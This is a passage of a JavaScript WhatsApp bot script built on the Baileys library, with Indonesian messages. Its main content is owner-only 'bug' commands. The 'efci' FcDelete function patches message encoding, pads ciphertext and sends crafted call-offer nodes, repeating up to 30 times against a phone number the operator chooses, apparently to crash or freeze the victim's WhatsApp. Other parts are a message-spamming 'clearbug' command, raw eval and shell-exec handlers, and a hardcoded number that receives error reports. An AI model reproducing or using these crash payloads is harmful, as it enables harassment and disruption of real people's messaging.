                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );
    await Putzz.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
   
    }
}

     if (!isOwner) return ReplyLanz(mess.owner);
                if (!q) return ReplyLanz(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return ReplyLanz(`— ex: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                ReplyLanz(`success! sent bug to ${target}\n> ᴛᴇʀᴋᴀᴅᴀɴɢ ʜᴀʟ ᴋᴇᴄɪʟ ᴅᴀᴘᴀᴛ ᴍᴇɴʏᴇʙᴀʙᴋᴀɴ ʜᴀʟ ʙᴇsᴀʀ  `);
                
                for (let i = 0; i < 2; i++) {
                    await Delay(Putzz, target);
                    await sleep(7000);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;


                case 'efci': {

                if (!isOwner) return ReplyLanz(`khusus owner`);
async function FcDelete(Putzz, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    const JustinApi = await generateWAMessageFromContent(
        target,
        { conversation: " " },
        { userJid: Putzz.user.id }
    );

    await Putzz.relayMessage(target, JustinApi.message, { messageId: JustinApi.key.id });
    await Putzz.sendMessage(target, { delete: JustinApi.key });

    let devices = (
        await Putzz.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await Putzz.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let Justin = xnxx();
    let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let XMods = Putzz.createParticipantNodes.bind(Putzz);
    let Cyber = Putzz.encodeWAMessage?.bind(Putzz);

    Putzz.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (Putzz.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let memeg = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = Putzz.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            memeg.map(async ({ recipientJid: jid, message: JustinApi }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) JustinApi = dsmMessage;

                let bytes = Official(Cyber ? Cyber(JustinApi) : encodeWAMessage(JustinApi));

                return Justin.mutex(jid, async () => {
                    let { type, ciphertext } = await Putzz.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [
                            {
                                tag: 'enc',
                                attrs: { v: '2', type, ...extraAttrs },
                                content: ciphertext
                            }
                        ]
                    };
                });
            })
        );

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let Exo = crypto.randomBytes(32);
    let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await Putzz.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let lemiting = {
        tag: "call",
        attrs: {
            to: target,
            id: Putzz.generateMessageTag(),
            from: Putzz.user.id
        },
        content: [
            {
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": Putzz.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    {
                        tag: "video",
                        attrs: {
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0",
                            enc: "vp8",
                            dec: "vp8"
                        }
                    },
                    { tag: "net", attrs: { medium: "3" } },
                    {
                        tag: "capability",
                        attrs: { ver: "1" },
                        content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                    },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity
                        ? [
                            {
                                tag: "device-identity",
                                attrs: {},
                                content: encodeSignedDeviceIdentity(
                                    Putzz.authState.creds.account,
                                    true
                                )
                            }
                        ]
                        : []
                    )
                ]
            }
        ]
    };

    await Putzz.sendNode(lemiting);
    console.log(`🩸Sending Bug To ${target} By Leviathan`);
}
                  if (!q) return ReplyLanz(`— ex: ${prefix + command} 62`);
 
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return ReplyLanz(`— ex: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
//                ReplyLanz(`success! sent bug to ${target}`);
                await reaksi('⚡') 
                for (let i = 0; i < 30; i++) {
                    await FcDelete(Putzz, target);
                    await sleep(5000);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'clearbug': {
    // Pastikan fungsi checkOwner sudah terdefinisi di atas
    if (!isOwner) return ReplyLanz("❌ Fitur ini khusus Owner!");

    if (!args[0]) return ReplyLanz("❌ Format salah!\nGunakan: .clearbug 62xxxx");

    // Format target ke JID WhatsApp
    let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Beri tahu pengirim bahwa proses dimulai
    await ReplyLanz(`⏳ Sedang membersihkan bug pada target *${args[0]}*...`);

    try {
        const loopCount = 5; // Jumlah pesan pembersihan
        const delayTime = 1500; // Jeda 1.5 detik (lebih aman untuk WA)

        for (let i = 0; i < loopCount; i++) {
            await Putzz.sendMessage(target, {
                text: "✨ *CLEANER SYSTEM* ✨\n\nChat ini telah dibersihkan oleh Lanz Official.\nStatus: [V] Aman / Normal"
            });

            // Delay agar tidak dianggap spam brutal oleh server WA
            await new Promise(resolve => setTimeout(resolve, delayTime));
        }

        // Balas sukses ke pengirim perintah
        ReplyLanz(`✅ *BERHASIL*\n\nTarget: ${args[0]}\nStatus: Bug Berhasil Dihapus (${loopCount}x)`);

    } catch (err) {
        console.error(err);
        ReplyLanz("❌ Gagal mengirim pesan ke target. Pastikan nomor benar dan bot aktif.");
    }
}
break;
async function mergeVideoAudio(videoUrl, audioUrl) {
  return new Promise((resolve, reject) => {
    const vid = "./tmp_vid.mp4"
    const aud = "./tmp_aud.opus"
    const out = "./tmp_out.mp4"

    // download file
    const axios = require("axios")

    Promise.all([
      axios({ url: videoUrl, responseType: "stream" }),
      axios({ url: audioUrl, responseType: "stream" })
    ]).then(([v, a]) => {

      const vStream = fs.createWriteStream(vid)
      const aStream = fs.createWriteStream(aud)

      v.data.pipe(vStream)
      a.data.pipe(aStream)

      vStream.on("finish", () => {
        aStream.on("finish", () => {

          // merge pake ffmpeg
          exec(`ffmpeg -i ${vid} -i ${aud} -c:v copy -c:a aac -shortest ${out}`, (err) => {
            if (err) return reject(err)

            resolve(out)
          })

        })
      })

    })
  })
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyLanz(evaled)
} catch (err) {
await ReplyLanz(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.quoted && m.quoted.stickerMessage && m.quoted.stickerMessage.fileSha256 === 'AZXnSkIq8kO2FtHVfCPC9dlQ2wNAg2fWN3jbFpiCFbQ=') {
  if (!m.isGroup) return ReplyLanz(mess.group)
  if (!isOwner && !isAdmins) return ReplyLanz(mess.admin)
  if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
  const input = m.quoted.sender
  const res = await Putzz.groupParticipantsUpdate(m.chat, [input], 'remove')
  await ReplyLanz(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
}

if (m.text.toLowerCase() == "bott") {
const video = await mergeVideoAudio(
  "https://tmpfiles.org/dl/25336596/1771636560959.mp4",
  "https://tmpfiles.org/dl/25337677/1771637344323.opus"
)

await Putzz.sendMessage(m.chat, {
  video: fs.readFileSync(video),
  gifPlayback: true
}, { quoted: m })
m.reply(`━ ⬢ ${ki}BOT ACTIVE${ki} ⬢ ━
   ╶━━━━━━━━━━━━━━━╴
- ᴊɪᴋᴀ ʙᴏᴛ ᴛᴇʀʜᴜʙᴜɴɢ ᴋᴀʀᴇɴᴀ ᴋᴏᴅᴇ ᴘᴀɪʀɪɴɢ
- ᴍᴀᴋᴀ ᴀᴋᴜ ᴍᴇʀᴇɴᴜɴɢ ᴍᴇʟɪʜᴀᴛᴍᴜ ᴅᴇɴɢᴀɴ ʏᴀɴɢ ʟᴀɪɴ
   ╶━━━━━━━━━━━━━━━╴
Special Quotes By Lanz`)
}
if (m.text.toLowerCase() == "bot") {
await Putzz.sendMessage(m.chat,{
   video:{ url:"https://files.catbox.moe/mkcpu4.mp4" },
   gifPlayback: true, 
   caption:
`                               ╼━ ⬢ ${ki}BOT ACTIVE${ki} ⬢ ━╾
 
"Seribu kebaikan tidak menjadikan mu terlihat layaknya malaikat.
namun satu kejahatan cukup membuat mu terlihat layaknya iblis"

                               ╶━━━━━━━━━━━━━━━╴
                                        ©𝙻𝚊𝚗𝚣𝙺𝚎𝚝𝚌𝚑𝚎`
},{ quoted:m }) 
await sleep(800);
await Putzz.sendMessage(m.chat, {
  audio: {
    url: "https://files.catbox.moe/puf8kp.opus"
  },
  mimetype: "audio/ogg; codecs=opus",
  ptt: true
})
}

if (m.text.toLowerCase() == "bot jagain pacar gue ya") {
ReplyLanz("siap sayang bot jagain pacar masnya pesan kamu jan chtan ama cowo lain ya jan lupa makan sholat nya🥰")
}

if (m.text.toLowerCase() == "p") {
ReplyLanz("lebih baih ucap salam dari pada *P* 🥰")
}

if (m.text.toLowerCase() == "sayang") {
ReplyLanz("dalem sayang maaaf ya saya bot, orang nya masih belum mainan hp orang nya masih kerja atau mungkin lagi tidur")
}

if (m.text.toLowerCase() == "yang") {
ReplyLanz("dalem sayang maaaf ya saya bot, orang nya masih belum mainan hp kayanya ini yang online bot nya yang di sayang bgt ama orangnya di tunggu dibalesan aja ya kak terimakasih")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyLanz(evaled)
} catch (err) {
await ReplyLanz(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyLanz(`${err}`)
if (stdout) return ReplyLanz(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

}

} /*catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Putzz.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}*/
catch (err) {
Putzz.sendMessage('6287862058684@s.whatsapp.net', {text: `*FITUR ERROR TERDETEKSI :*\n\n` +require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});